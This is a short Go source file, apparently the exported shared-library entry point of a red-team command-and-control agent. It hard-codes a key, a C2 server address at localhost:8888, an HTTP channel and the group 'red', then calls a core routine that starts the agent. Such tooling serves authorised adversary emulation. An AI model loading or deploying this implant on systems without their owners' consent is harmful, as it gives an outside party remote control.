// +build cgo

package main

import "C"
import (
	"../core"
)

var (
	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
	server = "http://localhost:8888"
	c2Name = "HTTP"
	c2Key = ""
	group = "red"
	listenP2P = false
)

//export VoidFunc
func VoidFunc() {
	c2Config := map[string]string{"c2Name": c2Name, "c2Key": c2Key}
	core.Core(server, group, 0, nil, c2Config, listenP2P, false)
}

func main() {}
